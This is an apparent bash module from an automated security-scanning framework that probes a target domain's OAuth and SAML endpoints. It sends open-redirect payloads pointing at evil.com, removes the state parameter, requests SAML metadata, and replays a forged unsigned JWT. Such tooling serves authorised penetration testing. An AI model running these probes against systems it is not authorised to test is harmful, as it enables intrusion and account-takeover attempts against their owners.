#!/bin/bash
# SAML/OAuth flow testing, token validation, redirect URI manipulation, state parameter bypass

saml_oauth_phase() {
    local domain="$1"
    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    local auth_dir="$output_dir/saml_oauth"
    local crawl_file="$output_dir/crawl/endpoints.txt"
    local live_file="$output_dir/live/live_subdomains.txt"

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true
    mkdir -p "$auth_dir"

    log "INFO" "Starting SAML/OAuth testing for $domain"
    py_log "INFO" "saml_oauth_phase started" --phase "saml_oauth" --target "$domain" || true

    # ------------------------------------------------------------------
    # 1. Discover OAuth/SAML endpoints
    # ------------------------------------------------------------------
    local oauth_endpoints="$auth_dir/oauth_endpoints.txt"
    local saml_endpoints="$auth_dir/saml_endpoints.txt"
    touch "$oauth_endpoints" "$saml_endpoints"

    if [ -f "$crawl_file" ] && command -v grep >/dev/null 2>&1; then
        log "INFO" "Discovering OAuth endpoints..."
        grep -iE "(oauth|authorize|token|callback|redirect_uri|client_id|auth/|login|sso|saml)" "$crawl_file" 2>/dev/null \
            | sort -u > "$oauth_endpoints" || true

        log "INFO" "Discovering SAML endpoints..."
        grep -iE "(saml|sso|idp|assertion|acs|saml2|metadata|logout|slo)" "$crawl_file" 2>/dev/null \
            | sort -u > "$saml_endpoints" || true
    fi

    local oauth_vulns="$auth_dir/oauth_vulns.txt"
    local saml_vulns="$auth_dir/saml_vulns.txt"
    local token_issues="$auth_dir/token_issues.txt"
    touch "$oauth_vulns" "$saml_vulns" "$token_issues"

    # ------------------------------------------------------------------
    # 2. OAuth redirect URI manipulation
    # ------------------------------------------------------------------
    if [ -f "$oauth_endpoints" ] && [ -s "$oauth_endpoints" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing OAuth redirect URI manipulation..."
        grep -iE "redirect_uri|return_url|callback" "$oauth_endpoints" > "$auth_dir/_redirect_targets.txt" 2>/dev/null || true

        while IFS= read -r target; do
            [ -z "$target" ] && continue
            for payload in "https://evil.com" "https://evil.com%2f%2e%2e" "//evil.com" "/\\evil.com" "https://evil.com@${domain}"; do
                local test_url
                test_url=$(echo "$target" | sed "s|redirect_uri=[^&]*|redirect_uri=$(printf '%s' "$payload" | sed 's|/|%2F|g')|" 2>/dev/null) || continue
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -L "$test_url" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(301|302|303|307|308)$"; then
                    echo "REDIRECT_URI_BYPASS: $test_url | Payload: $payload" >> "$oauth_vulns"
                    write_finding "{\"type\":\"oauth_redirect_uri_bypass\",\"url\":\"$test_url\",\"payload\":\"$payload\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$auth_dir/findings.json" || true
                fi
            done
        done < <(head -30 "$auth_dir/_redirect_targets.txt")
    fi

    # ------------------------------------------------------------------
    # 3. OAuth state parameter bypass
    # ------------------------------------------------------------------
    if [ -f "$oauth_endpoints" ] && [ -s "$oauth_endpoints" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing OAuth state parameter bypass..."
        grep -iE "state=" "$oauth_endpoints" > "$auth_dir/_state_targets.txt" 2>/dev/null || true

        while IFS= read -r target; do
            [ -z "$target" ] && continue
            # Test without state parameter
            local no_state_url
            no_state_url=$(echo "$target" | sed 's/[?&]state=[^&]*//g' 2>/dev/null) || continue
            if [ "$no_state_url" != "$target" ]; then
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$no_state_url" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|302|303)$"; then
                    echo "STATE_BYPASS: $no_state_url | State parameter removed successfully" >> "$oauth_vulns"
                    write_finding "{\"type\":\"oauth_state_bypass\",\"url\":\"$no_state_url\",\"severity\":\"medium\",\"domain\":\"$domain\"}" "$auth_dir/findings.json" || true
                fi
            fi
            # Test with empty state
            local empty_state_url
            empty_state_url=$(echo "$target" | sed 's/state=[^&]*/state=/g' 2>/dev/null) || continue
            if [ "$empty_state_url" != "$target" ]; then
                local code2
                code2=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$empty_state_url" 2>/dev/null) || true
                if echo "$code2" | grep -qE "^(200|302|303)$"; then
                    echo "EMPTY_STATE_ACCEPTED: $empty_state_url" >> "$oauth_vulns"
                fi
            fi
        done < <(head -20 "$auth_dir/_state_targets.txt")
    fi

    # ------------------------------------------------------------------
    # 4. SAML assertion testing
    # ------------------------------------------------------------------
    if [ -f "$saml_endpoints" ] && [ -s "$saml_endpoints" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing SAML endpoints..."
        while IFS= read -r saml_url; do
            [ -z "$saml_url" ] && continue
            # Check for metadata exposure
            local meta_url="${saml_url}?metadata"
            local code
            code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$meta_url" 2>/dev/null) || true
            if echo "$code" | grep -q "200"; then
                echo "SAML_METADATA_EXPOSED: $meta_url" >> "$saml_vulns"
                write_finding "{\"type\":\"saml_metadata_exposed\",\"url\":\"$meta_url\",\"severity\":\"medium\",\"domain\":\"$domain\"}" "$auth_dir/findings.json" || true
            fi
            # Check for signature validation bypass via GET
            local code2
            code2=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$saml_url" 2>/dev/null) || true
            if echo "$code2" | grep -qE "^(200|302)$"; then
                echo "SAML_ENDPOINT_ACCESSIBLE: $saml_url (GET)" >> "$saml_vulns"
            fi
        done < <(head -20 "$saml_endpoints")
    fi

    # ------------------------------------------------------------------
    # 5. Token validation checks
    # ------------------------------------------------------------------
    if [ -f "$oauth_endpoints" ] && [ -s "$oauth_endpoints" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing token validation..."
        grep -iE "(token|jwt|access_token|refresh_token)" "$oauth_endpoints" > "$auth_dir/_token_endpoints.txt" 2>/dev/null || true

        while IFS= read -r token_url; do
            [ -z "$token_url" ] && continue
            # Test with malformed JWT
            local fake_jwt="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
            local code
            code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $fake_jwt" \
                --max-time 10 "$token_url" 2>/dev/null) || true
            if echo "$code" | grep -qE "^(200|201)$"; then
                echo "TOKEN_VALIDATION_WEAK: $token_url | Forged JWT accepted" >> "$token_issues"
                write_finding "{\"type\":\"oauth_weak_token_validation\",\"url\":\"$token_url\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$auth_dir/findings.json" || true
            fi
            # Test with empty Authorization header
            local code2
            code2=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer " \
                --max-time 10 "$token_url" 2>/dev/null) || true
            if echo "$code2" | grep -qE "^(200|201)$"; then
                echo "EMPTY_TOKEN_ACCEPTED: $token_url" >> "$token_issues"
            fi
        done < <(head -20 "$auth_dir/_token_endpoints.txt")
    fi

    # ------------------------------------------------------------------
    # 6. Summary count
    # ------------------------------------------------------------------
    local total_vulns
    total_vulns=$(( $(wc -l < "$oauth_vulns" 2>/dev/null || echo 0) \
                 + $(wc -l < "$saml_vulns" 2>/dev/null || echo 0) \
                 + $(wc -l < "$token_issues" 2>/dev/null || echo 0) ))
    log "INFO" "SAML/OAuth testing complete: $total_vulns issues found"

    py_log "INFO" "saml_oauth_phase complete" --phase "saml_oauth" --target "$domain" --extra "{\"vulns\":$total_vulns}" || true
    echo "$total_vulns" > "$auth_dir/count.txt"
}

export -f saml_oauth_phase
